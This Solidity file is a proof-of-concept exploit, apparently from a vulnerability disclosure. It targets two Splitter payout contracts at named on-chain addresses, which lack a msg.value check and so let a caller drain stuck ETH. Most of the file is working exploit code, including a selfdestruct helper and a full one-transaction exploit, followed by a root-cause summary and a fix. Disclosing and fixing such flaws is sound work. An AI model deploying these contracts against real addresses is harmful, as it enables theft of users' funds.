// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.18;

/**
 * @title Proof of Concept - Insufficient msg.value Validation
 * @notice Demonstrates critical vulnerability in Splitter contracts
 * @dev This POC shows how an attacker can steal stuck ETH from the Splitter contract
 */

interface ISplitter {
    struct ERC20Payment {
        address token;
        uint256 amount;
    }

    function payWhitehat(
        bytes32 referenceId,
        address payable wh,
        ERC20Payment[] calldata payout,
        uint256 nativeTokenAmt,
        uint256 gas,
        uint256 fee
    ) external payable;

    function payWhitehat(
        bytes32 referenceId,
        address payable wh,
        ERC20Payment[] calldata payout,
        uint256 nativeTokenAmt,
        uint256 gas
    ) external payable;
}

/**
 * @title ForceETH
 * @notice Helper contract to force-send ETH to Splitter via selfdestruct
 * @dev This simulates how ETH can get stuck in the Splitter contract
 */
contract ForceETH {
    function forceSend(address payable target) external payable {
        selfdestruct(target);
    }
}

/**
 * @title ExploitSplitter3234
 * @notice POC for Splitter_3234 (0x323498d3fb02594ac3e0a11b2dea337893ecabbe)
 * @dev More severe because Splitter_3234 has no withdrawal function
 */
contract ExploitSplitter3234 {
    ISplitter public immutable splitter;
    address public immutable attacker;

    constructor(address _splitter) {
        splitter = ISplitter(_splitter);
        attacker = msg.sender;
    }

    /**
     * @notice Step 1: Simulate stuck ETH in the Splitter
     * @dev In reality, this could be from anyone accidentally sending ETH
     */
    function step1_ForceETHIntoSplitter() external payable {
        require(msg.value > 0, "Send ETH to force into Splitter");

        ForceETH forcer = new ForceETH();
        forcer.forceSend{value: msg.value}(payable(address(splitter)));
    }

    /**
     * @notice Step 2: Exploit - Pay insufficient msg.value and steal stuck ETH
     * @dev This demonstrates the vulnerability
     */
    function step2_ExploitWithInsufficientValue(
        uint256 whitehatPayment,
        uint256 feePercent,
        uint256 msgValueToSend
    ) external payable {
        require(msg.value == msgValueToSend, "Send exact msgValue");

        // Calculate what SHOULD be sent
        uint256 feeAmount = (whitehatPayment * feePercent) / 10000;
        uint256 totalRequired = whitehatPayment + feeAmount;

        require(
            msgValueToSend < totalRequired,
            "POC: msgValue must be insufficient to demonstrate vulnerability"
        );

        // Empty ERC20Payment array
        ISplitter.ERC20Payment[] memory emptyPayout = new ISplitter.ERC20Payment[](0);

        // Call payWhitehat with INSUFFICIENT msg.value
        // This should revert, but it won't if contract has stuck ETH!
        splitter.payWhitehat{value: msgValueToSend}(
            bytes32(uint256(1)), // referenceId
            payable(attacker), // whitehat (send payment to attacker)
            emptyPayout, // no ERC20 payments
            whitehatPayment, // native token amount
            100000, // gas
            feePercent // fee
        );

        // If we reach here, the exploit succeeded!
        // We paid msgValueToSend but received whitehatPayment
        // Difference stolen from contract: whitehatPayment - msgValueToSend
    }

    /**
     * @notice Complete exploit in one transaction
     */
    function fullExploit() external payable {
        // Example: Force 5 ETH into contract, then steal most of it
        require(msg.value >= 5.1 ether, "Need at least 5.1 ETH for demo");

        // Step 1: Force 5 ETH into Splitter (simulating "stuck" funds)
        ForceETH forcer = new ForceETH();
        forcer.forceSend{value: 5 ether}(payable(address(splitter)));

        // Step 2: Pay only 0.1 ETH but request 4 ETH payment
        // Fee: 10% of 4 ETH = 0.4 ETH
        // Total required: 4.4 ETH
        // We send: 0.1 ETH
        // Deficit: 4.3 ETH (stolen from forced/stuck funds)

        ISplitter.ERC20Payment[] memory emptyPayout = new ISplitter.ERC20Payment[](0);

        uint256 balanceBefore = attacker.balance;

        splitter.payWhitehat{value: 0.1 ether}(
            bytes32(uint256(1)),
            payable(attacker),
            emptyPayout,
            4 ether, // Request 4 ETH payment
            100000,
            1000 // 10% fee
        );

        uint256 balanceAfter = attacker.balance;

        // Attacker spent: 5 ETH (forced) + 0.1 ETH (msg.value) = 5.1 ETH
        // Attacker received: 4 ETH
        // Net cost: 1.1 ETH for a 4 ETH payment
        // In a real scenario where someone else's funds are stuck,
        // attacker would only spend 0.1 ETH to get 4 ETH!

        assert(balanceAfter - balanceBefore == 4 ether);
    }

    receive() external payable {}
}

/**
 * @title ExploitSplitter03fd
 * @notice POC for Splitter_03fd (0x03fd3d61423e6d46dcc3917862fbc57653dc3eb0)
 * @dev Less severe because owner can withdraw stuck funds, but still vulnerable in time window
 */
contract ExploitSplitter03fd {
    ISplitter public immutable splitter;
    address public immutable attacker;

    constructor(address _splitter) {
        splitter = ISplitter(_splitter);
        attacker = msg.sender;
    }

    function exploit(uint256 whitehatPayment, uint256 msgValueToSend) external payable {
        require(msg.value == msgValueToSend, "Send exact msgValue");

        // Splitter_03fd has a fee state variable, not a parameter
        // Calculate expected fee (assuming 10% = 1000 basis points)
        uint256 totalRequired = whitehatPayment + (whitehatPayment * 1000) / 10000;

        require(
            msgValueToSend < totalRequired,
            "POC: msgValue must be insufficient to demonstrate vulnerability"
        );

        ISplitter.ERC20Payment[] memory emptyPayout = new ISplitter.ERC20Payment[](0);

        // Call payWhitehat with INSUFFICIENT msg.value
        splitter.payWhitehat{value: msgValueToSend}(
            bytes32(uint256(1)),
            payable(attacker),
            emptyPayout,
            whitehatPayment,
            100000
        );
    }

    receive() external payable {}
}

/**
 * @title Attack Scenario Summary
 *
 * VULNERABILITY: Missing msg.value validation in _payWhitehatNative()
 *
 * ROOT CAUSE:
 * The function calculates `nativeAmountDistributed = nativeTokenAmt + feeAmount`
 * but only checks `if (msg.value > nativeAmountDistributed)` for refund purposes.
 * It does NOT check `require(msg.value >= nativeAmountDistributed)`.
 *
 * ATTACK FLOW:
 *
 * 1. SETUP: Stuck ETH in Contract
 *    - Victim accidentally sends ETH to Splitter via selfdestruct
 *    - OR previous transaction leaves dust
 *    - For Splitter_3234: Funds are PERMANENTLY stuck (no withdrawal function)
 *    - For Splitter_03fd: Funds stuck until owner withdraws (time window vulnerability)
 *
 * 2. EXPLOIT: Attacker Calls payWhitehat with Insufficient msg.value
 *    - Attacker wants to pay whitehat 10 ETH
 *    - Fee is 10% = 1 ETH
 *    - Total required: 11 ETH
 *    - Attacker sends: 2 ETH (insufficient!)
 *    - Expected: Transaction reverts
 *    - Actual: Transaction succeeds using stuck ETH
 *
 * 3. RESULT:
 *    - feeRecipient receives: 1 ETH
 *    - Whitehat (attacker) receives: 10 ETH
 *    - Total distributed: 11 ETH
 *    - Attacker paid: 2 ETH
 *    - Stolen from contract: 9 ETH
 *
 * IMPACT:
 * - Splitter_3234: CRITICAL - Direct theft of permanently stuck funds
 * - Splitter_03fd: HIGH - Direct theft during time window before owner withdrawal
 *
 * AFFECTED CODE:
 * ```solidity
 * function _payWhitehatNative(...) internal {
 *     uint256 feeAmount = (nativeTokenAmt * fee) / FEE_BASIS;
 *     if (feeAmount > 0) {
 *         (bool successFee, ) = feeRecipient.call{ value: feeAmount }("");
 *         require(successFee, "Splitter: Failed to send ether to fee receiver");
 *     }
 *     (bool successWh, ) = wh.call{ value: nativeTokenAmt, gas: gas }("");
 *     require(successWh, "Splitter: Failed to send ether to whitehat");
 *
 *     uint256 nativeAmountDistributed = nativeTokenAmt + feeAmount;
 *     // MISSING: require(msg.value >= nativeAmountDistributed, "Insufficient msg.value");
 *     if (msg.value > nativeAmountDistributed) {
 *         _refundCaller(msg.value - nativeAmountDistributed);
 *     }
 * }
 * ```
 *
 * FIX:
 * Add validation at the start of _payWhitehatNative():
 * ```solidity
 * uint256 feeAmount = (nativeTokenAmt * fee) / FEE_BASIS;
 * uint256 nativeAmountDistributed = nativeTokenAmt + feeAmount;
 * require(msg.value >= nativeAmountDistributed, "Splitter: Insufficient msg.value");
 * ```
 */
